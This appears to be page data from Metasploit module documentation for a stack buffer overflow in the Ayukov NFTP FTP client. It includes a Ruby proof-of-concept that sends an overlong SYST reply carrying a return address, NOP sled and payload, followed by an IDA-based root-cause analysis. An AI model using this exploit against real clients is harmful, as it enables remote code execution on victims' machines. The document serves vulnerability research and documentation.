{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/ftp/ayukov_nftp","result":{"data":{"moduleMetadataJson":{"id":"5e3a5775-b440-573d-bbbc-38c9ac0321f7","name":"Ayukov NFTP FTP Client Buffer Overflow","fullname":"exploit/windows/ftp/ayukov_nftp","description":"This module exploits a stack-based buffer overflow vulnerability against Ayukov NFTPD FTP\n          Client 2.0 and earlier. By responding with a long string of data for the SYST request, it\n          is possible to cause a denail-of-service condition on the FTP client, or arbitrary remote\n          code exeuction under the context of the user if successfully exploited.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/ftp/ayukov_nftp","documentationSlug":"/modules/documentation/exploit/windows/ftp/ayukov_nftp","referencesSlug":"/modules/references/exploit/windows/ftp/ayukov_nftp"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Ayukov is an FTP client that was written by Sergey Ayukov back in 1994. Development stopped in\n2011, and it is vulnerable to a stack-based buffer overflow vulnerability due to the way it\nhandles the server input.</p>\n<p>The exploit was tested on Windows XP SP3 (English).</p>\n<p>The vulnerable copy can be <a href=\"https://www.exploit-db.com/apps/a766d928899200ed6a21f7c790b5cbe5-nftp-1.71-i386-win32.exe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">downloaded from Exploit-DB</a>.</p>\n<h3 id=\"poc\" style=\"position:relative;\"><a href=\"#poc\" aria-label=\"poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PoC</h3>\n<p>A submission was made to Metasploit as <a href=\"https://github.com/rapid7/metasploit-framework/pull/9360\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">PR #9360</a>. Here's an example of how to crash the FTP client:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">  <span class=\"token comment\"># Let the client log in</span>\n  client<span class=\"token punctuation\">.</span>get_once\n\n  user <span class=\"token operator\">=</span> <span class=\"token string\">\"331 OK.\\r\\n\"</span>\n  client<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span>\n\n  client<span class=\"token punctuation\">.</span>get_once\n  pass <span class=\"token operator\">=</span> <span class=\"token string\">\"230 OK.\\r\\n\"</span>\n  client<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>pass<span class=\"token punctuation\">)</span>\n\n  sploit <span class=\"token operator\">=</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">4116</span>\n  sploit <span class=\"token operator\">&lt;</span><span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">[</span>target<span class=\"token punctuation\">.</span>ret<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'V'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># JMP ESP here</span>\n  sploit <span class=\"token operator\">&lt;</span><span class=\"token operator\">&lt;</span> <span class=\"token string\">\"\\x90\"</span><span class=\"token operator\">*</span><span class=\"token number\">16</span>\n  sploit <span class=\"token operator\">&lt;</span><span class=\"token operator\">&lt;</span> payload<span class=\"token punctuation\">.</span>encoded\n  sploit <span class=\"token operator\">&lt;</span><span class=\"token operator\">&lt;</span> <span class=\"token string\">\"C\"</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">15000</span> <span class=\"token operator\">-</span> <span class=\"token number\">4116</span> <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> payload<span class=\"token punctuation\">.</span>encoded<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span>\n  sploit <span class=\"token operator\">&lt;</span><span class=\"token operator\">&lt;</span> <span class=\"token string\">\"\\r\\n\"</span>\n\n  client<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>sploit<span class=\"token punctuation\">)</span>\n\n  client<span class=\"token punctuation\">.</span>get_once\n  pwd <span class=\"token operator\">=</span> <span class=\"token string\">\"257\\r\\n\"</span>\n  client<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>pwd<span class=\"token punctuation\">)</span>\n  client<span class=\"token punctuation\">.</span>get_once</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"root-cause-analysis\" style=\"position:relative;\"><a href=\"#root-cause-analysis\" aria-label=\"root cause analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Root Cause Analysis</h3>\n<p>When serving the PoC against the vulnerable app, the client's command prompt shows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">12:28:43 331 OK.\n12:28:43 USER anonymous\n12:28:43 230 OK.\n12:28:43 Successfully logged in as &#39;anonymous@192.168.0.12&#39;\n12:28:43 SYST\n12:28:43 .................. Lots of AAAAAs here .....................\n12:28:43 TYPE I\n12:28:43 257</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The interesting part here is that when the client sends a <code class=\"language-text\">SYST</code> request, the server responds\nwith a long string of data attempting to cause a crash. This would be a good starting point to\ninvestigate the root cause.</p>\n<p>With IDA Pro, we can tell that the <code class=\"language-text\">SYST</code> string is at the following location:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">.text:004096B6 ; char aSyst[]\n.text:004096B6 aSyst           db &#39;SYST&#39;,0             ; DATA XREF: sub_409978+B8C\u0019o</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>When we cross reference, we can tell this is used by the <code class=\"language-text\">OpenControlConnection</code> function.\nAlthough there is no symbol to identify the actual function name \"OpenControlConnection\", the\ndebugging message at the beginning of the function is a big hint:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-c line-numbers\"><code class=\"language-c\"><span class=\"token keyword\">int</span> __usercall OpenControlConnection@<span class=\"token operator\">&lt;</span>eax<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>ebx<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2@<span class=\"token operator\">&lt;</span>edi<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a3@<span class=\"token operator\">&lt;</span>esi<span class=\"token operator\">></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">sub_45AF40</span><span class=\"token punctuation\">(</span>savedregs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>name<span class=\"token punctuation\">.</span>sa_data<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a2<span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>name<span class=\"token punctuation\">.</span>sa_data<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a3<span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>name<span class=\"token punctuation\">.</span>sa_data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>dword_477AEC <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">sub_419B4C</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">do</span>\n      <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">sub_403484</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"begin OpenControlConnection()\\n\"</span><span class=\"token punctuation\">,</span> charResBuffer<span class=\"token punctuation\">[</span><span class=\"token number\">4088</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Anyway, inside the OpenControlConnection function, we can see that the <code class=\"language-text\">SYST</code> command is\nrequested here for SendFTPRequest (no symbol of clue of the name, I just decided to name it this\nway):</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">.text:0040A504                 push    offset aSyst    ; &quot;SYST&quot;\n.text:0040A509                 lea     eax, [ebp+charResBuffer]\n.text:0040A50F                 push    eax             ; charResBuffer\n.text:0040A510                 lea     eax, [ebp+args]\n.text:0040A516                 push    eax             ; int\n.text:0040A517                 push    0               ; int\n.text:0040A519                 call    SendFTPRequest</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Inside the SendFTPRequest function, it looks like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-c line-numbers\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">SendFTPRequest</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> arg_4<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>charResBuffer<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Format<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ebx@0</span>\n  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edi@0</span>\n  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// esi@0</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edx@1</span>\n  <span class=\"token keyword\">char</span> Dst<span class=\"token punctuation\">[</span><span class=\"token number\">16384</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+18h] [ebp-4000h]@2</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>savedregs<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4018h] [ebp+0h]@1</span>\n  va_list va<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4030h] [ebp+18h]@1</span>\n\n  <span class=\"token function\">va_start</span><span class=\"token punctuation\">(</span>va<span class=\"token punctuation\">,</span> Format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">sub_45AF40</span><span class=\"token punctuation\">(</span>savedregs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  savedregs <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span>\n  v7 <span class=\"token operator\">=</span> Format<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> Format <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    v4 <span class=\"token operator\">=</span> Dst<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// This actually checks the input for the FTP command from the client.</span>\n    <span class=\"token comment\">// The 0x4000u indicates the string should not be longer than that, otherwise</span>\n    <span class=\"token comment\">// there will be a buffer overflow warning in this function.</span>\n    <span class=\"token function\">snprintf1</span><span class=\"token punctuation\">(</span>Dst<span class=\"token punctuation\">,</span> <span class=\"token number\">0x4000u</span><span class=\"token punctuation\">,</span> Format<span class=\"token punctuation\">,</span> va<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v7 <span class=\"token operator\">=</span> Dst<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">SendReceive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v4<span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">,</span> v6<span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">,</span> arg_4<span class=\"token punctuation\">,</span> charResBuffer<span class=\"token punctuation\">,</span> v7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>We were able to tell the second argument for <code class=\"language-text\">SendFTPRequest</code> is actually a buffer for receiving\nthe server's response, because the way it is used:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-c line-numbers\"><code class=\"language-c\">result <span class=\"token operator\">=</span> <span class=\"token function\">SendFTPRequest</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>args<span class=\"token punctuation\">,</span> charResBuffer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"SYST\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> result <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">4</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> result <span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">goto</span> LABEL_231<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>args <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">sub_445CEC</span><span class=\"token punctuation\">(</span>charResBuffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>charResBuffer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"unix\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>charResBuffer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"powerweb\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>dword_47B1E0 <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">goto</span> LABEL_206<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>In addition, this buffer is actually on the stack, and it's 4096 long:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">-00001010 charResBuffer   db 4096 dup(?)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>This means that if the server responds with something longer than 4096 bytes for the <code class=\"language-text\">SYST</code> request,\nthe data may corrupt the stack, and cause a stack-based buffer overflow. At the end of\n<code class=\"language-text\">OpenControlConnection</code>, the <code class=\"language-text\">RETN</code> ends up loading the corrupt data, which may lead to\narbitrary code execution:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">.text:0040AC39                 lea     esp, [ebp-2048h]\n.text:0040AC3F                 pop     ebx\n.text:0040AC40                 pop     esi\n.text:0040AC41                 pop     edi\n.text:0040AC42                 leave\n.text:0040AC43                 retn</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Since whoever is using <code class=\"language-text\">SendFTPRequest</code> is responsible for providing the buffer of the server\nresponse, and there are 47 other cross-references, it is possible there are different ways to\ntrigger the same bug. And since it doesn't look like there is a patch (because the product is\nno longer in active development, from the exploit developer's perspective, it is not necessary\nto look for other ways to exploit it).</p>"}}},"pageContext":{"id":"5e3a5775-b440-573d-bbbc-38c9ac0321f7"}}}